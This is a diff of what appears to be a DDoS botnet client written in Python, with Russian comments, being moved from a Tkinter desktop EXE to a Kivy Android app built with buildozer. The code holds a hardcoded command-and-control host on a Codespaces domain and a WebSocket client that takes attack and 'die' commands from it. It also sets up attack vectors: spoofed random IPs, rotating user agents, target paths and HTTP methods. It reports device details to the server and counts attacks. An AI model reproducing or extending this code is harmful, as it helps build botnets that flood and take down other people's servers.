@@ -1,8 +1,5 @@
-#!/usr/bin/env python3
-# c2_client.py — универсальный GUI-клиент
-# Под ПК (Windows) — компилируется в EXE через PyInstaller
-# Под телефон — работает в Pydroid 3
-# Стиль 1:1 с DDoS Monitor панелью
+# main.py — Kivy-клиент для Android (APK) и десктопа
+# Собирается через buildozer в .apk
 
 import asyncio
 import threading
@@ -19,7 +16,7 @@ import multiprocessing
 from urllib.parse import urlparse
 
 # ═══════════════════════════════════════════════════════════
-#  АДРЕС ПАНЕЛИ — впиши свой codespace URL
+#  АДРЕС ПАНЕЛИ
 # ═══════════════════════════════════════════════════════════
 C2_HOST = "zany-space-waffle-jr5r77vr547ph5pxj-8000.app.github.dev"
 C2_PORT = 443
@@ -29,21 +26,18 @@ USE_SSL = True
 RECONNECT_DELAY = 5
 HEARTBEAT_INTERVAL = 3
 
-# ═══════════════════════════════════════════════════════════
-#  ПАЛИТРА — 1:1 как в DDoS Monitor
-# ═══════════════════════════════════════════════════════════
-BG          = "#0a0e17"
-BG_PANEL    = "#131a26"
-BG_CARD     = "#0d1219"
-BG_INPUT    = "#131a26"
-BORDER      = "#1e2a3a"
-FG          = "#e0e6ed"
-FG_DIM      = "#6b7a90"
-ACCENT      = "#00ffaa"
-ACCENT_BLUE = "#00aaff"
-DANGER      = "#ff4466"
-WARN        = "#ffcc00"
-PURPLE      = "#cc88ff"
+# ---------- цвета (1:1 с панелью) ----------
+BG          = (0.039, 0.055, 0.090, 1)   # #0a0e17
+BG_PANEL    = (0.075, 0.102, 0.149, 1)   # #131a26
+BG_CARD     = (0.051, 0.071, 0.098, 1)   # #0d1219
+BORDER      = (0.118, 0.165, 0.227, 1)   # #1e2a3a
+FG          = (0.878, 0.902, 0.929, 1)   # #e0e6ed
+FG_DIM      = (0.420, 0.478, 0.565, 1)   # #6b7a90
+ACCENT      = (0.000, 1.000, 0.667, 1)   # #00ffaa
+ACCENT_BLUE = (0.000, 0.667, 1.000, 1)   # #00aaff
+DANGER      = (1.000, 0.267, 0.400, 1)   # #ff4466
+WARN        = (1.000, 0.800, 0.000, 1)   # #ffcc00
+PURPLE      = (0.800, 0.533, 1.000, 1)   # #cc88ff
 
 # ---------- векторные константы ----------
 PATHS = ["/", "/index.html", "/api", "/api/v1", "/login", "/wp-login.php",
@@ -53,7 +47,6 @@ UAS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
 ]
 
@@ -61,7 +54,7 @@ METHODS = ["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS"]
 
 
 # ═══════════════════════════════════════════════════════════
-#  ЯДРО АТАКИ (без изменений — работает на любой платформе)
+#  ДВИЖОК АТАКИ (то же что в exe-версии)
 # ═══════════════════════════════════════════════════════════
 def rand_ip():
     return ".".join(str(random.randint(1, 254)) for _ in range(4))
@@ -296,9 +289,6 @@ class AttackWorker(threading.Thread):
                          self.stop_evt, self.mode, self.vectors, self.ctx_cache)
 
 
-# ═══════════════════════════════════════════════════════════
-#  ИНФО ОБ УСТРОЙСТВЕ
-# ═══════════════════════════════════════════════════════════
 def get_device_info():
     hostname = ""
     try:
@@ -314,7 +304,7 @@ def get_device_info():
         except Exception:
             pass
     if hostname.lower() in ("localhost", "127.0.0.1", ""):
-        hostname = os.environ.get("HOSTNAME") or os.environ.get("USER") or "device"
+        hostname = os.environ.get("HOSTNAME") or os.environ.get("USER") or "android-device"
 
     try:
         system = platform.system() or "unknown"
@@ -389,7 +379,7 @@ def get_device_info():
 
 
 # ═══════════════════════════════════════════════════════════
-#  СОСТОЯНИЕ АТАКИ
+#  C2-КЛИЕНТ (WebSocket)
 # ═══════════════════════════════════════════════════════════
 attack_state = {"workers": [], "stop_evt": None, "stats": None, "timer": None}
 C2_WS = {"ws": None, "lock": threading.Lock(), "loop": None}
@@ -467,9 +457,6 @@ def stop_attack():
         send_log_async("атака остановлена", "stop")
 
 
-# ═══════════════════════════════════════════════════════════
-#  АСИНХРОННЫЙ C2-КЛИЕНТ
-# ═══════════════════════════════════════════════════════════
 async def run_c2_client(host, port, use_ssl, on_status_callback=None):
     import aiohttp
 
@@ -481,7 +468,7 @@ async def run_c2_client(host, port, use_ssl, on_status_callback=None):
         url = f"{proto}://{host}:{port}/ws/client"
 
     if on_status_callback:
-        on_status_callback(f"подключение к {url}...")
+        on_status_callback(f"подключение...")
 
     async with aiohttp.ClientSession() as session:
         while True:
@@ -489,7 +476,7 @@ async def run_c2_client(host, port, use_ssl, on_status_callback=None):
                 ws = await session.ws_connect(url, heartbeat=30, timeout=15)
             except Exception as e:
                 if on_status_callback:
-                    on_status_callback(f"ошибка: {e}, повтор через {RECONNECT_DELAY}с")
+                    on_status_callback(f"ошибка: {type(e).__name__}, повтор...")
                 await asyncio.sleep(RECONNECT_DELAY)
                 continue
 
@@ -535,7 +522,6 @@ async def run_c2_client(host, port, use_ssl, on_status_callback=None):
                         break
 
             sender_task = asyncio.create_task(sender())
-
             try:
                 async for msg in ws:
                     if msg.type == aiohttp.WSMsgType.TEXT:
@@ -559,13 +545,13 @@ async def run_c2_client(host, port, use_ssl, on_status_callback=None):
                             pass
                         elif c == "die":
                             if on_status_callback:
-                                on_status_callback("сервер отключил устройство")
+                                on_status_callback("отключено сервером")
                             stop_attack()
                             await ws.close()
                             return
             except Exception as e:
                 if on_status_callback:
-                    on_status_callback(f"потеря связи: {e}")
+                    on_status_callback(f"потеря связи")
             finally:
                 sender_task.cancel()
 
@@ -577,146 +563,205 @@ async def run_c2_client(host, port, use_ssl, on_status_callback=None):
                 pass
 
             if on_status_callback:
-                on_status_callback(f"реконнект через {RECONNECT_DELAY}с")
+                on_status_callback(f"реконнект...")
             await asyncio.sleep(RECONNECT_DELAY)
 
 
 # ═══════════════════════════════════════════════════════════
-#  GUI
+#  KIVY GUI
 # ═══════════════════════════════════════════════════════════
-import tkinter as tk
-from tkinter import font as tkfont
+from kivy.app import App
+from kivy.uix.boxlayout import BoxLayout
+from kivy.uix.floatlayout import FloatLayout
+from kivy.uix.label import Label
+from kivy.uix.button import Button
+from kivy.uix.widget import Widget
+from kivy.graphics import Color, Rectangle, RoundedRectangle, Line
+from kivy.core.window import Window
+from kivy.clock import Clock
+from kivy.metrics import dp
 
 
-class ClientApp:
-    def __init__(self, root):
-        self.root = root
-        self.device_type = None    # "pc" или "phone"
-        self.client_thread = None
+class NeonButton(Button):
+    """кастомная кнопка с фоном и цветом акцента"""
+    def __init__(self, text="", bg_color=ACCENT, fg_color=BG, font_size=dp(20),
+                 bold=True, height=dp(56), radius=dp(8), **kwargs):
+        super().__init__(text=text, **kwargs)
+        self.background_normal = ""
+        self.background_down = ""
+        self.background_color = (0, 0, 0, 0)
+        self.color = fg_color
+        self.font_size = font_size
+        self.bold = bold
+        self.size_hint_y = None
+        self.height = height
+        self.bg_color = bg_color
+        self.radius = radius
+        with self.canvas.before:
+            self._color_inst = Color(*bg_color)
+            self._rect_inst = RoundedRectangle(pos=self.pos, size=self.size, radius=[radius])
+        self.bind(pos=self._update_rect, size=self._update_rect)
+
+    def _update_rect(self, *args):
+        self._rect_inst.pos = self.pos
+        self._rect_inst.size = self.size
+
+
+class DeviceCard(BoxLayout):
+    """карточка выбора устройства"""
+    def __init__(self, icon, title, subtitle, extra, color, on_press=None, **kwargs):
+        super().__init__(orientation="vertical", size_hint_y=None, height=dp(110),
+                         padding=(dp(16), dp(14)), spacing=dp(4), **kwargs)
+        self.color = color
+
+        with self.canvas.before:
+            self._border_color = Color(*BORDER)
+            self._border_rect = RoundedRectangle(pos=self.pos, size=self.size, radius=[dp(10)])
+            self._bg_color = Color(*BG_PANEL)
+            self._bg_rect = RoundedRectangle(pos=(self.x + dp(2), self.y + dp(2)),
+                                              size=(self.width - dp(4), self.height - dp(4)),
+                                              radius=[dp(8)])
+        self.bind(pos=self._update, size=self._update)
+        self._on_press = on_press
+
+        # верхняя полоска цвета
+        top_row = BoxLayout(orientation="horizontal", size_hint_y=None, height=dp(30))
+        icon_lbl = Label(text=icon, font_size=dp(28), color=color,
+                         size_hint=(None, 1), width=dp(50), halign="center")
+        icon_lbl.bind(size=lambda s, v: setattr(s, 'text_size', (v[0], None)))
+        top_row.add_widget(icon_lbl)
+
+        text_col = BoxLayout(orientation="vertical")
+        title_lbl = Label(text=title, font_size=dp(18), bold=True, color=color,
+                          halign="left", valign="middle")
+        title_lbl.bind(size=lambda s, v: setattr(s, 'text_size', v))
+        text_col.add_widget(title_lbl)
+
+        sub_lbl = Label(text=subtitle, font_size=dp(12), color=FG,
+                        halign="left", valign="middle")
+        sub_lbl.bind(size=lambda s, v: setattr(s, 'text_size', v))
+        text_col.add_widget(sub_lbl)
+
+        extra_lbl = Label(text=extra, font_size=dp(10), color=FG_DIM,
+                          halign="left", valign="middle")
+        extra_lbl.bind(size=lambda s, v: setattr(s, 'text_size', v))
+        text_col.add_widget(extra_lbl)
+
+        top_row.add_widget(text_col)
+        self.add_widget(top_row)
+
+        # прозрачный overlay чтобы ловить клики
+        self.overlay = Button(background_normal="", background_color=(0, 0, 0, 0))
+        self.overlay.bind(on_press=lambda x: self._on_press() if self._on_press else None)
+
+    def _update(self, *args):
+        self._border_rect.pos = self.pos
+        self._border_rect.size = self.size
+        self._bg_rect.pos = (self.x + dp(2), self.y + dp(2))
+        self._bg_rect.size = (self.width - dp(4), self.height - dp(4))
+
+    def on_touch_down(self, touch):
+        if self.collide_point(*touch.pos):
+            if self._on_press:
+                self._on_press()
+            return True
+        return super().on_touch_down(touch)
+
+
+class RootWidget(FloatLayout):
+    def __init__(self, **kwargs):
+        super().__init__(**kwargs)
+        self.device_type = None
         self.running = False
-        self.status_text = tk.StringVar(value="ожидание выбора устройства")
-        self.attacks_count = tk.StringVar(value="0")
-        self.uptime_text = tk.StringVar(value="0s")
         self.start_time = None
+        self.status_text = "ожидание выбора"
+        self.status_color = FG_DIM
+        self.attacks_count = 0
+        self.uptime_seconds = 0
 
-        self.setup_window()
+        with self.canvas.before:
+            Color(*BG)
+            self._bg_rect = Rectangle(pos=self.pos, size=self.size)
+        self.bind(pos=self._bg, size=self._bg)
+
+        self.main_box = BoxLayout(orientation="vertical", padding=dp(20), spacing=dp(12),
+                                   size_hint=(1, 1))
+        self.add_widget(self.main_box)
+
+        # Clock для обновления UI
+        Clock.schedule_interval(self._update_ui, 0.5)
+
         self.show_choice_screen()
 
-    def setup_window(self):
-        self.root.title("Neon C2 Client")
-        self.root.configure(bg=BG)
-        self.root.resizable(False, False)
-        # компактное окно 420x600 — влезает и на телефоне, и на пк
-        w, h = 420, 600
-        sw = self.root.winfo_screenwidth()
-        sh = self.root.winfo_screenheight()
-        x = (sw - w) // 2
-        y = (sh - h) // 2
-        self.root.geometry(f"{w}x{h}+{x}+{y}")
+    def _bg(self, *args):
+        self._bg_rect.pos = self.pos
+        self._bg_rect.size = self.size
 
     def clear(self):
-        for w in self.root.winfo_children():
-            w.destroy()
+        self.main_box.clear_widgets()
 
-    # ---------- ЭКРАН 1 — выбор устройства ----------
+    # ---------- экран 1: выбор ----------
     def show_choice_screen(self):
         self.clear()
 
         # шапка
-        header = tk.Frame(self.root, bg=BG)
-        header.pack(fill="x", padx=20, pady=(24, 8))
+        title = Label(text="🛡️ Neon C2", font_size=dp(32), bold=True,
+                       color=ACCENT, size_hint_y=None, height=dp(48),
+                       halign="left", valign="middle")
+        title.bind(size=lambda s, v: setattr(s, 'text_size', v))
+        self.main_box.add_widget(title)
 
-        title = tk.Label(header, text="🛡️ Neon C2",
-                         font=("Segoe UI", 20, "bold"),
-                         fg=ACCENT, bg=BG)
-        title.pack(anchor="w")
-
-        tk.Label(header, text="клиент для подключения к панели управления",
-                 font=("Segoe UI", 9),
-                 fg=FG_DIM, bg=BG).pack(anchor="w", pady=(4, 0))
+        sub = Label(text="клиент для подключения к панели", font_size=dp(12),
+                     color=FG_DIM, size_hint_y=None, height=dp(20),
+                     halign="left", valign="middle")
+        sub.bind(size=lambda s, v: setattr(s, 'text_size', v))
+        self.main_box.add_widget(sub)
 
         # разделитель
-        tk.Frame(self.root, bg=BORDER, height=1).pack(fill="x", padx=20, pady=(16, 20))
+        sep = Widget(size_hint_y=None, height=dp(2))
+        with sep.canvas:
+            Color(*BORDER)
+            Rectangle(pos=sep.pos, size=sep.size)
+        sep.bind(pos=lambda s, v: setattr(s.canvas.children[-1], 'pos', v),
+                 size=lambda s, v: setattr(s.canvas.children[-1], 'size', v))
+        self.main_box.add_widget(sep)
 
-        # инструкция
-        tk.Label(self.root, text="ВЫБЕРИ ТИП УСТРОЙСТВА",
-                 font=("Segoe UI", 10, "bold"),
-                 fg=FG_DIM, bg=BG).pack(anchor="w", padx=20, pady=(0, 16))
+        instruction = Label(text="ВЫБЕРИ ТИП УСТРОЙСТВА", font_size=dp(12), bold=True,
+                             color=FG_DIM, size_hint_y=None, height=dp(30),
+                             halign="left", valign="middle")
+        instruction.bind(size=lambda s, v: setattr(s, 'text_size', v))
+        self.main_box.add_widget(instruction)
 
-        # карточка ПК
-        self.make_device_card(
-            icon="💻",
-            title="ПК",
-            subtitle="Windows · Linux · macOS",
-            extra="x64 / x86 · 4-16 ядер",
-            color=ACCENT_BLUE,
-            command=lambda: self.select_device("pc")
-        )
+        # карточки
+        card_pc = DeviceCard(icon="💻", title="ПК",
+                              subtitle="Windows · Linux · macOS",
+                              extra="x64 / x86 · 4-16 ядер",
+                              color=ACCENT_BLUE,
+                              on_press=lambda: self.select_device("pc"))
+        self.main_box.add_widget(card_pc)
 
-        # карточка телефона
-        self.make_device_card(
-            icon="📱",
-            title="Телефон",
-            subtitle="Android через Pydroid 3",
-            extra="arm64 · 4-8 ядер",
-            color=ACCENT,
-            command=lambda: self.select_device("phone")
-        )
+        card_phone = DeviceCard(icon="📱", title="Телефон",
+                                 subtitle="Android",
+                                 extra="arm64 · 4-8 ядер",
+                                 color=ACCENT,
+                                 on_press=lambda: self.select_device("phone"))
+        self.main_box.add_widget(card_phone)
+
+        # растяжка
+        self.main_box.add_widget(Widget())
 
         # футер
-        tk.Frame(self.root, bg=BORDER, height=1).pack(fill="x", padx=20, pady=(20, 12))
-        tk.Label(self.root, text=f"сервер: {C2_HOST}",
-                 font=("Consolas", 8),
-                 fg=FG_DIM, bg=BG).pack(pady=(0, 20))
-
-    def make_device_card(self, icon, title, subtitle, extra, color, command):
-        """карточка выбора устройства — стиль как в DDoS Monitor"""
-        outer = tk.Frame(self.root, bg=BG)
-        outer.pack(fill="x", padx=20, pady=6)
-
-        card = tk.Frame(outer, bg=BG_PANEL,
-                        highlightthickness=1,
-                        highlightbackground=BORDER,
-                        highlightcolor=color,
-                        cursor="hand2")
-        card.pack(fill="x")
-
-        # верхняя полоска градиента
-        tk.Frame(card, bg=color, height=3).pack(fill="x")
-
-        inner = tk.Frame(card, bg=BG_PANEL)
-        inner.pack(fill="x", padx=16, pady=14)
-
-        # иконка
-        tk.Label(inner, text=icon, font=("Segoe UI Emoji", 32),
-                 fg=color, bg=BG_PANEL).pack(side="left", padx=(0, 14))
-
-        # текст
-        text_col = tk.Frame(inner, bg=BG_PANEL)
-        text_col.pack(side="left", fill="x", expand=True)
-
-        tk.Label(text_col, text=title, font=("Segoe UI", 14, "bold"),
-                 fg=color, bg=BG_PANEL).pack(anchor="w")
-        tk.Label(text_col, text=subtitle, font=("Segoe UI", 9),
-                 fg=FG, bg=BG_PANEL).pack(anchor="w", pady=(2, 0))
-        tk.Label(text_col, text=extra, font=("Consolas", 8),
-                 fg=FG_DIM, bg=BG_PANEL).pack(anchor="w", pady=(2, 0))
-
-        # клики на все дочерние виджеты
-        def bind_all(w):
-            w.bind("<Button-1>", lambda e: command())
-            w.bind("<Enter>", lambda e: card.config(highlightbackground=color))
-            w.bind("<Leave>", lambda e: card.config(highlightbackground=BORDER))
-            for ch in w.winfo_children():
-                bind_all(ch)
-
-        bind_all(card)
+        footer = Label(text=f"сервер: {C2_HOST}", font_size=dp(10),
+                        color=FG_DIM, size_hint_y=None, height=dp(30),
+                        halign="center", valign="middle")
+        footer.bind(size=lambda s, v: setattr(s, 'text_size', v))
+        self.main_box.add_widget(footer)
 
     def select_device(self, dtype):
         self.device_type = dtype
         self.show_start_screen()
 
-    # ---------- ЭКРАН 2 — кнопка СТАРТ ----------
+    # ---------- экран 2: старт ----------
     def show_start_screen(self):
         self.clear()
 
@@ -724,152 +769,122 @@ class ClientApp:
         color = ACCENT_BLUE if is_pc else ACCENT
 
         # шапка
-        header = tk.Frame(self.root, bg=BG)
-        header.pack(fill="x", padx=20, pady=(24, 8))
+        title = Label(text="🛡️ Neon C2", font_size=dp(28), bold=True,
+                       color=ACCENT, size_hint_y=None, height=dp(42),
+                       halign="left", valign="middle")
+        title.bind(size=lambda s, v: setattr(s, 'text_size', v))
+        self.main_box.add_widget(title)
 
-        tk.Label(header, text="🛡️ Neon C2",
-                 font=("Segoe UI", 20, "bold"),
-                 fg=ACCENT, bg=BG).pack(anchor="w")
+        # бейдж устройства
+        badge = BoxLayout(size_hint_y=None, height=dp(50), padding=dp(12), spacing=dp(8))
+        with badge.canvas.before:
+            Color(*BG_PANEL)
+            RoundedRectangle(pos=badge.pos, size=badge.size, radius=[dp(8)])
+        badge.bind(pos=lambda s, v: None, size=lambda s, v: None)
+        badge.add_widget(Label(text=("💻" if is_pc else "📱"), font_size=dp(24),
+                                color=color, size_hint_x=None, width=dp(40)))
+        badge.add_widget(Label(text=("ПК" if is_pc else "Телефон"), font_size=dp(16),
+                                bold=True, color=color, halign="left", valign="middle"))
+        change_btn = Button(text="сменить", font_size=dp(11),
+                             background_normal="", background_color=(*BG_CARD[:3], 1),
+                             color=FG_DIM, size_hint_x=None, width=dp(80))
+        change_btn.bind(on_press=lambda x: self.show_choice_screen())
+        badge.add_widget(change_btn)
+        self.main_box.add_widget(badge)
 
-        tk.Label(header, text="клиент для подключения к панели управления",
-                 font=("Segoe UI", 9),
-                 fg=FG_DIM, bg=BG).pack(anchor="w", pady=(4, 0))
-
-        tk.Frame(self.root, bg=BORDER, height=1).pack(fill="x", padx=20, pady=(16, 20))
-
-        # бейдж выбранного устройства
-        badge_outer = tk.Frame(self.root, bg=BG)
-        badge_outer.pack(fill="x", padx=20, pady=(0, 16))
-
-        badge = tk.Frame(badge_outer, bg=BG_PANEL,
-                         highlightthickness=1, highlightbackground=color)
-        badge.pack(fill="x")
-        tk.Frame(badge, bg=color, height=3).pack(fill="x")
-
-        badge_inner = tk.Frame(badge, bg=BG_PANEL)
-        badge_inner.pack(fill="x", padx=14, pady=10)
-
-        tk.Label(badge_inner, text="💻" if is_pc else "📱",
-                 font=("Segoe UI Emoji", 18), fg=color, bg=BG_PANEL).pack(side="left", padx=(0, 10))
-        tk.Label(badge_inner, text="ПК" if is_pc else "Телефон",
-                 font=("Segoe UI", 11, "bold"), fg=color, bg=BG_PANEL).pack(side="left")
-
-        change_btn = tk.Button(badge_inner, text="сменить",
-                                font=("Segoe UI", 8),
-                                bg=BG_CARD, fg=FG_DIM,
-                                activebackground=BORDER, activeforeground=ACCENT,
-                                relief="flat", bd=0, padx=10, pady=4,
-                                cursor="hand2",
-                                command=self.show_choice_screen)
-        change_btn.pack(side="right")
-
-        # инфо об устройстве
+        # инфо
         info = get_device_info()
-        info_card = tk.Frame(self.root, bg=BG_CARD,
-                             highlightthickness=1, highlightbackground=BORDER)
-        info_card.pack(fill="x", padx=20, pady=(0, 16))
-
-        info_inner = tk.Frame(info_card, bg=BG_CARD)
-        info_inner.pack(fill="x", padx=14, pady=12)
-
-        self.make_info_row(info_inner, "имя", info['display_name'][:32])
-        self.make_info_row(info_inner, "ОС", info['os'][:32])
-        self.make_info_row(info_inner, "ядра", str(info['cpu']))
-        self.make_info_row(info_inner, "ОЗУ", f"{info['ram_mb']} МБ" if info['ram_mb'] else "—")
-        self.make_info_row(info_inner, "сервер", C2_HOST[:32])
+        info_box = BoxLayout(orientation="vertical", size_hint_y=None, height=dp(140),
+                              padding=dp(12), spacing=dp(4))
+        with info_box.canvas.before:
+            Color(*BG_CARD)
+            RoundedRectangle(pos=info_box.pos, size=info_box.size, radius=[dp(8)])
+        for label, value in [
+            ("имя", info["display_name"][:32]),
+            ("ОС", info["os"][:32]),
+            ("ядра", str(info["cpu"])),
+            ("ОЗУ", f"{info['ram_mb']} МБ" if info["ram_mb"] else "—"),
+        ]:
+            row = BoxLayout(size_hint_y=None, height=dp(22))
+            lbl = Label(text=label, font_size=dp(11), color=FG_DIM,
+                         size_hint_x=None, width=dp(60), halign="left", valign="middle")
+            lbl.bind(size=lambda s, v: setattr(s, 'text_size', v))
+            row.add_widget(lbl)
+            val = Label(text=value, font_size=dp(11), color=FG,
+                         halign="left", valign="middle")
+            val.bind(size=lambda s, v: setattr(s, 'text_size', v))
+            row.add_widget(val)
+            info_box.add_widget(row)
+        self.main_box.add_widget(info_box)
 
         # статус
-        tk.Label(self.root, text="СТАТУС",
-                 font=("Segoe UI", 9, "bold"),
-                 fg=FG_DIM, bg=BG).pack(anchor="w", padx=20, pady=(8, 6))
+        status_title = Label(text="СТАТУС", font_size=dp(11), bold=True,
+                              color=FG_DIM, size_hint_y=None, height=dp(24),
+                              halign="left", valign="middle")
+        status_title.bind(size=lambda s, v: setattr(s, 'text_size', v))
+        self.main_box.add_widget(status_title)
 
-        status_box = tk.Frame(self.root, bg=BG_CARD,
-                              highlightthickness=1, highlightbackground=BORDER)
-        status_box.pack(fill="x", padx=20, pady=(0, 20))
+        status_box = BoxLayout(size_hint_y=None, height=dp(40), padding=dp(10), spacing=dp(8))
+        with status_box.canvas.before:
+            Color(*BG_CARD)
+            RoundedRectangle(pos=status_box.pos, size=status_box.size, radius=[dp(6)])
 
-        status_inner = tk.Frame(status_box, bg=BG_CARD)
-        status_inner.pack(fill="x", padx=14, pady=10)
+        self.status_dot = Widget(size_hint=(None, None), size=(dp(12), dp(12)))
+        with self.status_dot.canvas:
+            self._dot_color = Color(*FG_DIM)
+            self._dot_rect = Rectangle(pos=self.status_dot.pos, size=self.status_dot.size)
+        self.status_dot.bind(pos=lambda s, v: setattr(self._dot_rect, 'pos', v),
+                              size=lambda s, v: setattr(self._dot_rect, 'size', v))
+        status_box.add_widget(self.status_dot)
 
-        self.dot = tk.Canvas(status_inner, width=10, height=10,
-                              bg=BG_CARD, highlightthickness=0)
-        self.dot.pack(side="left", padx=(0, 8))
-        self.dot_id = self.dot.create_oval(2, 2, 8, 8, fill=FG_DIM, outline="")
+        self.status_lbl = Label(text=self.status_text, font_size=dp(11),
+                                 color=FG_DIM, halign="left", valign="middle")
+        self.status_lbl.bind(size=lambda s, v: setattr(s, 'text_size', v))
+        status_box.add_widget(self.status_lbl)
 
-        self.status_lbl = tk.Label(status_inner, textvariable=self.status_text,
-                                     font=("Consolas", 9),
-                                     fg=FG_DIM, bg=BG_CARD, anchor="w")
-        self.status_lbl.pack(side="left", fill="x", expand=True)
+        self.main_box.add_widget(status_box)
 
-        # кнопка СТАРТ
-        self.start_btn = tk.Button(self.root,
-            text="⚡  ЗАПУСТИТЬ",
-            font=("Segoe UI", 14, "bold"),
-            bg=color, fg=BG,
-            activebackground=color, activeforeground=BG,
-            relief="flat", bd=0, pady=14,
-            cursor="hand2",
-            command=self.on_start_click)
-        self.start_btn.pack(fill="x", padx=20, pady=(0, 10))
+        # кнопка старт
+        self.start_btn = NeonButton(text="⚡ ЗАПУСТИТЬ", bg_color=color, fg_color=BG,
+                                     font_size=dp(20), height=dp(64))
+        self.start_btn.bind(on_press=lambda x: self.on_start_click())
+        self.main_box.add_widget(self.start_btn)
 
-        # кнопка СТОП (скрыта изначально)
-        self.stop_btn = tk.Button(self.root,
-            text="СТОП",
-            font=("Segoe UI", 11, "bold"),
-            bg=BG_CARD, fg=DANGER,
-            activebackground=DANGER, activeforeground=BG,
-            relief="flat", bd=0, pady=10,
-            cursor="hand2",
-            highlightthickness=1, highlightbackground=BORDER,
-            command=self.on_stop_click,
-            state="disabled")
-        self.stop_btn.pack(fill="x", padx=20, pady=(0, 10))
+        # кнопка стоп
+        self.stop_btn = NeonButton(text="СТОП", bg_color=BG_CARD, fg_color=DANGER,
+                                    font_size=dp(14), height=dp(44))
+        self.stop_btn.bind(on_press=lambda x: self.on_stop_click())
+        self.main_box.add_widget(self.stop_btn)
 
-        # счётчик атак
-        counter_row = tk.Frame(self.root, bg=BG)
-        counter_row.pack(fill="x", padx=20, pady=(0, 20))
+        self.main_box.add_widget(Widget())
 
-        tk.Label(counter_row, text="атак выполнено:",
-                 font=("Consolas", 9), fg=FG_DIM, bg=BG).pack(side="left")
-        tk.Label(counter_row, textvariable=self.attacks_count,
-                 font=("Consolas", 11, "bold"), fg=ACCENT, bg=BG).pack(side="left", padx=(6, 20))
-        tk.Label(counter_row, text="время:",
-                 font=("Consolas", 9), fg=FG_DIM, bg=BG).pack(side="left")
-        tk.Label(counter_row, textvariable=self.uptime_text,
-                 font=("Consolas", 11, "bold"), fg=ACCENT, bg=BG).pack(side="left", padx=(6, 0))
-
-    def make_info_row(self, parent, label, value):
-        row = tk.Frame(parent, bg=BG_CARD)
-        row.pack(fill="x", pady=2)
-        tk.Label(row, text=label, font=("Consolas", 9),
-                 fg=FG_DIM, bg=BG_CARD, width=8, anchor="w").pack(side="left")
-        tk.Label(row, text=value, font=("Consolas", 9),
-                 fg=FG, bg=BG_CARD, anchor="w").pack(side="left")
+        # счётчики
+        counters = BoxLayout(size_hint_y=None, height=dp(30), spacing=dp(10))
+        self.counter_lbl = Label(text="атак: 0 | время: 0с", font_size=dp(11),
+                                   color=FG_DIM, halign="center", valign="middle")
+        self.counter_lbl.bind(size=lambda s, v: setattr(s, 'text_size', v))
+        counters.add_widget(self.counter_lbl)
+        self.main_box.add_widget(counters)
 
     def set_status(self, text, color=None, dot_color=None):
-        def do():
-            self.status_text.set(text)
-            if color:
-                self.status_lbl.config(fg=color)
-            if dot_color and hasattr(self, 'dot'):
-                self.dot.itemconfig(self.dot_id, fill=dot_color)
-        try:
-            self.root.after(0, do)
-        except Exception:
-            pass
+        def _do(dt):
+            self.status_text = text
+            if hasattr(self, "status_lbl"):
+                self.status_lbl.text = text
+                if color:
+                    self.status_lbl.color = color
+            if dot_color and hasattr(self, "_dot_color"):
+                self._dot_color.rgba = dot_color
+        Clock.schedule_once(_do, 0)
 
-    # ---------- ЛОГИКА СТАРТА ----------
+    # ---------- старт ----------
     def on_start_click(self):
         if self.running:
             return
         self.running = True
         self.start_time = time.time()
-
-        self.start_btn.config(state="disabled", text="⚡  ЗАПУЩЕНО", bg=BORDER)
-        self.stop_btn.config(state="normal")
-
         self.set_status("запуск клиента...", WARN, WARN)
 
-        # запускаем C2-клиент в отдельном потоке
         def run():
             loop = asyncio.new_event_loop()
             asyncio.set_event_loop(loop)
@@ -883,44 +898,39 @@ class ClientApp:
             finally:
                 self.running = False
 
-        self.client_thread = threading.Thread(target=run, daemon=True)
-        self.client_thread.start()
-
-        # тикер uptime
-        self.update_uptime()
-
-    def update_uptime(self):
-        if not self.running:
-            return
-        elapsed = int(time.time() - self.start_time)
-        h = elapsed // 3600
-        m = (elapsed % 3600) // 60
-        s = elapsed % 60
-        parts = []
-        if h: parts.append(f"{h}ч")
-        if m: parts.append(f"{m}м")
-        parts.append(f"{s}с")
-        self.uptime_text.set(" ".join(parts))
-        self.root.after(1000, self.update_uptime)
+        threading.Thread(target=run, daemon=True).start()
 
     def on_stop_click(self):
         if not self.running:
             return
         self.running = False
         self.set_status("остановлено", FG_DIM, FG_DIM)
-        self.start_btn.config(state="normal", text="⚡  ЗАПУСТИТЬ", bg=ACCENT)
-        self.stop_btn.config(state="disabled")
         stop_attack()
-        # закрываем процесс целиком — самый надёжный способ разорвать
         time.sleep(0.5)
         os._exit(0)
 
+    def _update_ui(self, dt):
+        if self.running and self.start_time:
+            self.uptime_seconds = int(time.time() - self.start_time)
+            h = self.uptime_seconds // 3600
+            m = (self.uptime_seconds % 3600) // 60
+            s = self.uptime_seconds % 60
+            parts = []
+            if h: parts.append(f"{h}ч")
+            if m: parts.append(f"{m}м")
+            parts.append(f"{s}с")
+            uptime_str = " ".join(parts)
+        else:
+            uptime_str = "0с"
+        if hasattr(self, "counter_lbl"):
+            self.counter_lbl.text = f"атак: {self.attacks_count} | время: {uptime_str}"
 
-def main():
-    root = tk.Tk()
-    app = ClientApp(root)
-    root.mainloop()
+
+class C2ClientApp(App):
+    def build(self):
+        Window.clearcolor = BG
+        return RootWidget()
 
 
 if __name__ == "__main__":
-    main()
+    C2ClientApp().run()
